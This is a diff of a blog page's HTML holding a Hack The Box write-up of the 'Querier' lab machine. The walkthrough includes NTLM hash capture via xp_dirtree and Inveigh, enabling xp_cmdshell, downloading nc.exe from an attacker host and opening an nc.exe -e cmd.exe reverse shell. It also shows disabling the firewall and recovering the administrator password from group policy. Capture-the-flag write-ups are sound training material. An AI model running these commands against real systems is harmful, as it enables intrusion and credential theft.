@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Querier (Commando) | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Querier (Commando) | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Querier (Commando)" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree &#39;\\10.10.xx.xx\fakeshare&#39; Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell &#39;powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe&#39;; EXEC xp_cmdshell &#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337&#39; We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon" />
-<meta property="og:description" content="Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree &#39;\\10.10.xx.xx\fakeshare&#39; Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell &#39;powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe&#39;; EXEC xp_cmdshell &#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337&#39; We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon" />
+<meta name="description" content="Second post of solving Querier from Hack The Box - with Commando-VM." />
+<meta property="og:description" content="Second post of solving Querier from Hack The Box - with Commando-VM." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/querier-2/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/querier-2/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/querier-2/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-06-22T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\\Windows\\System32\\drivers\\etc\\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\\\querier.htb\\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\\Tools\\Inveigh\\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree &#39;\\\\10.10.xx.xx\\fakeshare&#39; Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\\mssql-svc &quot;C:\\Program Files\\HeidiSQL\\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell &#39;powershell Invoke-WebRequest -o C:\\Users\\mssql-svc\\Desktop\\nc.exe http://10.10.xx.xx/nc.exe&#39;; EXEC xp_cmdshell &#39;C:\\Users\\mssql-svc\\Desktop\\nc.exe -e cmd.exe 10.10.xx.xx 1337&#39; We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\\Administrator then I used psexec : runas /netonly /user:QUERIER\\Administrator cmd.exe psexec \\\\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab Next Hack The Box write-up : Hack The Box - Netmon","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/querier-2/","image":"http://localhost:4000/hackthebox/querier-2/0.png","headline":"Hack The Box - Querier (Commando)","dateModified":"2019-06-22T00:00:00+02:00","datePublished":"2019-06-22T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/querier-2/"},"@context":"http://schema.org"}</script>
+{"description":"Second post of solving Querier from Hack The Box - with Commando-VM.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/querier-2/","image":"http://localhost:4000/hackthebox/querier-2/0.png","headline":"Hack The Box - Querier (Commando)","dateModified":"2019-06-22T00:00:00+02:00","datePublished":"2019-06-22T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/querier-2/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,108 +32,110 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Querier (Commando)</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/smb/';">smb</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-06-22T00:00:00+02:00" itemprop="datePublished">Jun 22, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Querier (Commando)</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/smb/">smb</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 22 Jun 2019</div>
+  
+  <div class="post-description">Second post of solving Querier from Hack The Box - with Commando-VM.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-">Hey guys this is the second post for Querier, you can read the first post <a href="/hack-the-box/querier">here</a>. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is <code class="highlighter-rouge">10.10.10.125</code> I added it to <code class="highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> as <code class="highlighter-rouge">querier.htb</code>. Let’s jump right in !</h4>
-<p><img src="/images/hackthebox/querier-2/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys this is the second post for Querier, you can read the first post <a href="/hack-the-box/querier">here</a>. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is <code class="highlighter-rouge">10.10.10.125</code> I added it to <code class="highlighter-rouge">C:\Windows\System32\drivers\etc\hosts</code> as <code class="highlighter-rouge">querier.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/querier-2/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
-<img src="/images/hackthebox/querier-2/1.png" alt="" /></p>
-<h4 id="we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb">We got <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">mssql</code> server on port 1433. We don’t have credentials for <code class="highlighter-rouge">mssql</code> so let’s check <code class="highlighter-rouge">smb</code>.</h4>
-<p><br /></p>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC querier.htb</code>
+<img src="/images/hackthebox/querier-2/1.png" alt="" />
+<br /> We got <code class="highlighter-rouge">smb</code> and <code class="highlighter-rouge">mssql</code> server on port 1433. We don’t have credentials for <code class="highlighter-rouge">mssql</code> so let’s check <code class="highlighter-rouge">smb</code>.
+<br /></p>
 <hr />
 
-<h3 id="smb">Smb</h3>
-<h4 id="we-need-to-list-the-shares-we-can-do-that-using-net-view-">We need to list the shares, We can do that using <code class="highlighter-rouge">net view</code> :</h4>
-<p><code class="highlighter-rouge">net view querier.htb</code>
-<img src="/images/hackthebox/querier-2/2.png" alt="" /></p>
-<h4 id="it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice">It only showed us <code class="highlighter-rouge">Reports</code> because it’s the only share that we can access anonymously which is nice.</h4>
-<h4 id="we-can-mount-the-share-from-cmd-with-net-use-">We can mount the share from <code class="highlighter-rouge">cmd</code> with <code class="highlighter-rouge">net use</code> :</h4>
-<p><code class="highlighter-rouge">net use Z: \\querier.htb\Reports /persistent:yes</code>
+<h2 id="smb">Smb</h2>
+<p><br /> We need to list the shares, We can do that using <code class="highlighter-rouge">net view</code> :
+<code class="highlighter-rouge">net view querier.htb</code>
+<img src="/images/hackthebox/querier-2/2.png" alt="" />
+<br /> It only showed us <code class="highlighter-rouge">Reports</code> because it’s the only share that we can access anonymously which is nice. 
+<br /> We can mount the share from <code class="highlighter-rouge">cmd</code> with <code class="highlighter-rouge">net use</code> :
+<code class="highlighter-rouge">net use Z: \\querier.htb\Reports /persistent:yes</code>
 <img src="/images/hackthebox/querier-2/3.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/querier-2/4.png" alt="" /></p>
-<h4 id="we-can-also-do-it-from-the-file-explorer-">We can also do it from the file explorer :</h4>
-<p><img src="/images/hackthebox/querier-2/5.png" alt="" />
+<img src="/images/hackthebox/querier-2/4.png" alt="" />
+<br /> We can also do it from the file explorer :
+<img src="/images/hackthebox/querier-2/5.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/querier-2/6.png" alt="" /></p>
 <hr />
 
-<h3 id="mssql">MSSQL</h3>
-<h4 id="i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-">I used <code class="highlighter-rouge">olevba</code> to get credentials from the excel file like I did in the <a href="/hack-the-box/querier/">first post</a> :</h4>
-<p><img src="/images/hackthebox/querier-2/7.png" alt="" /></p>
-<h4 id="to-connect-to-the-mssql-server-i-will-use-heidisql-">To connect to the <code class="highlighter-rouge">mssql</code> server I will use <a href="https://www.heidisql.com/">HeidiSQL</a> :</h4>
-<p><img src="/images/hackthebox/querier-2/8.png" alt="" /></p>
-<h4 id="however-authentication-failed-">However, authentication failed :</h4>
-<p><img src="/images/hackthebox/querier-2/9.png" alt="" /></p>
-<h4 id="i-tried-windows-authentication-">I tried windows authentication :</h4>
-<p><img src="/images/hackthebox/querier-2/10.png" alt="" /></p>
-<h4 id="but-it-also-failed-because-it-was-trying-as-guest-not-reporting-">But it also failed because it was trying as guest not reporting :</h4>
-<p><img src="/images/hackthebox/querier-2/11.png" alt="" /></p>
-<h4 id="to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-">To solve this we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">heidi</code> as reporting :</h4>
-<p><code class="highlighter-rouge">runas /netonly /user:QUERIER\reporting cmd.exe</code>
-<img src="/images/hackthebox/querier-2/12.png" alt="" /></p>
-<h4 id="from-the-new-cmd-session-i-ran-heidi-">From the new <code class="highlighter-rouge">cmd</code> session I ran <code class="highlighter-rouge">heidi</code> :</h4>
-<p><img src="/images/hackthebox/querier-2/13.png" alt="" /></p>
-<h4 id="now-windows-authentication-worked-">Now windows authentication worked :</h4>
-<p><img src="/images/hackthebox/querier-2/14.png" alt="" /></p>
-<h4 id="got-permission-denied-for-xp_cmdshell-">Got permission denied for <code class="highlighter-rouge">xp_cmdshell</code> :</h4>
-<p><img src="/images/hackthebox/querier-2/15.png" alt="" /></p>
-<h4 id="we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y">We can run a fake <code class="highlighter-rouge">smb</code> server to capture credentials using a tool called <code class="highlighter-rouge">Inveigh</code> which works like responder. From <code class="highlighter-rouge">powershell</code> I imported <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Import-Module C:\Tools\Inveigh\Inveigh.ps1</code>). Then I disabled the firewall (<code class="highlighter-rouge">netsh advfirewall set allprofiles state off</code>) and invoked <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y</code>).</h4>
-<h4 id="from-heidi-i-used-xp_dirtree-">From <code class="highlighter-rouge">Heidi</code> I used <code class="highlighter-rouge">xp_dirtree</code> :</h4>
-<p><code class="highlighter-rouge">EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'</code>
-<img src="/images/hackthebox/querier-2/16.png" alt="" /></p>
-<h4 id="inveigh-captured-the-ntlmv2-hash-for-mssql-svc-"><code class="highlighter-rouge">Inveigh</code> captured the <code class="highlighter-rouge">NTLMv2</code> hash for <code class="highlighter-rouge">mssql-svc</code> :</h4>
-<p><img src="/images/hackthebox/querier-2/17.png" alt="" /></p>
-<h4 id="after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-">After cracking the hash on another box the password is <code class="highlighter-rouge">corporate568</code>. Now we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">Heidi</code> as <code class="highlighter-rouge">mssql-svc</code> :</h4>
-<p><code class="highlighter-rouge">runas /netonly /user:QUERIER\mssql-svc "C:\Program Files\HeidiSQL\heidisql.exe"</code>
-<img src="/images/hackthebox/querier-2/18.png" alt="" /></p>
-<h4 id="queries-to-enable-xp_cmdshell-">Queries to enable <code class="highlighter-rouge">xp_cmdshell</code> :</h4>
+<h2 id="mssql">MSSQL</h2>
+<p><br /> I used <code class="highlighter-rouge">olevba</code> to get credentials from the excel file like I did in the <a href="/hack-the-box/querier/">first post</a> :
+<img src="/images/hackthebox/querier-2/7.png" alt="" />
+<br /> To connect to the <code class="highlighter-rouge">mssql</code> server I will use <a href="https://www.heidisql.com/">HeidiSQL</a> :
+<img src="/images/hackthebox/querier-2/8.png" alt="" />
+<br /> However, authentication failed :
+<img src="/images/hackthebox/querier-2/9.png" alt="" />
+<br /> I tried windows authentication :
+<img src="/images/hackthebox/querier-2/10.png" alt="" />
+<br /> But it also failed because it was trying as guest not reporting :
+<img src="/images/hackthebox/querier-2/11.png" alt="" />
+<br /> To solve this we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">heidi</code> as reporting :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\reporting cmd.exe</code>
+<img src="/images/hackthebox/querier-2/12.png" alt="" />
+<br /> From the new <code class="highlighter-rouge">cmd</code> session I ran <code class="highlighter-rouge">heidi</code> :
+<img src="/images/hackthebox/querier-2/13.png" alt="" />
+<br /> Now windows authentication worked :
+<img src="/images/hackthebox/querier-2/14.png" alt="" />
+<br /> Got permission denied for <code class="highlighter-rouge">xp_cmdshell</code> :
+<img src="/images/hackthebox/querier-2/15.png" alt="" />
+<br /> We can run a fake <code class="highlighter-rouge">smb</code> server to capture credentials using a tool called <code class="highlighter-rouge">Inveigh</code> which works like responder. From <code class="highlighter-rouge">powershell</code> I imported <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Import-Module C:\Tools\Inveigh\Inveigh.ps1</code>). Then I disabled the firewall (<code class="highlighter-rouge">netsh advfirewall set allprofiles state off</code>) and invoked <code class="highlighter-rouge">Inveigh</code> (<code class="highlighter-rouge">Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y</code>). 
+<br /> From <code class="highlighter-rouge">Heidi</code> I used <code class="highlighter-rouge">xp_dirtree</code> :
+<code class="highlighter-rouge">EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'</code>
+<img src="/images/hackthebox/querier-2/16.png" alt="" />
+<br /> <code class="highlighter-rouge">Inveigh</code> captured the <code class="highlighter-rouge">NTLMv2</code> hash for <code class="highlighter-rouge">mssql-svc</code> :
+<img src="/images/hackthebox/querier-2/17.png" alt="" />
+<br /> After cracking the hash on another box the password is <code class="highlighter-rouge">corporate568</code>. Now we can use <code class="highlighter-rouge">runas</code> to run <code class="highlighter-rouge">Heidi</code> as <code class="highlighter-rouge">mssql-svc</code> :
+<code class="highlighter-rouge">runas /netonly /user:QUERIER\mssql-svc "C:\Program Files\HeidiSQL\heidisql.exe"</code>
+<img src="/images/hackthebox/querier-2/18.png" alt="" />
+<br /> Queries to enable <code class="highlighter-rouge">xp_cmdshell</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
@@ -141,77 +144,174 @@ RECONFIGURE;
 <p><img src="/images/hackthebox/querier-2/19.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/querier-2/20.png" alt="" /></p>
-<h4 id="great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-">Great, we got <code class="highlighter-rouge">RCE</code>. I ran a python server to host <code class="highlighter-rouge">nc.exe</code> then I downloaded it on the box and got a reverse shell :</h4>
+<img src="/images/hackthebox/querier-2/20.png" alt="" />
+<br /> Great, we got <code class="highlighter-rouge">RCE</code>. I ran a python server to host <code class="highlighter-rouge">nc.exe</code> then I downloaded it on the box and got a reverse shell :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
 EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
 </code></pre></div></div>
 <p><img src="/images/hackthebox/querier-2/21.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/querier-2/22.png" alt="" /></p>
-<h4 id="we-owned-user">We owned user.</h4>
-<p><br /></p>
+<img src="/images/hackthebox/querier-2/22.png" alt="" />
+<br /> We owned user.
+<br /></p>
 <hr />
 
-<h3 id="gpp-privilege-escalation-root-flag">GPP, Privilege Escalation, Root Flag</h3>
-<h4 id="as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-">As I said in the <a href="/hack-the-box/querier/">first post</a>, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like <code class="highlighter-rouge">LinEnum.sh</code> for Linux one of them is <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"><code class="highlighter-rouge">powerup.ps1</code></a> and it checks for group policy passwords. Let’s check that one :</h4>
-<p><img src="/images/hackthebox/querier-2/23.png" alt="" />
+<h2 id="gpp-privilege-escalation-root-flag">GPP, Privilege Escalation, Root Flag</h2>
+<p><br /> As I said in the <a href="/hack-the-box/querier/">first post</a>, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like <code class="highlighter-rouge">LinEnum.sh</code> for Linux one of them is <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1"><code class="highlighter-rouge">powerup.ps1</code></a> and it checks for group policy passwords. Let’s check that one :
+<img src="/images/hackthebox/querier-2/23.png" alt="" />
 <br />
 <br />
 <img src="/images/hackthebox/querier-2/24.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/querier-2/25.png" alt="" /></p>
-<h4 id="it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1">It also decrypts the password which is nice. Password : <code class="highlighter-rouge">MyUnclesAreMarioAndLuigi!!1!</code></h4>
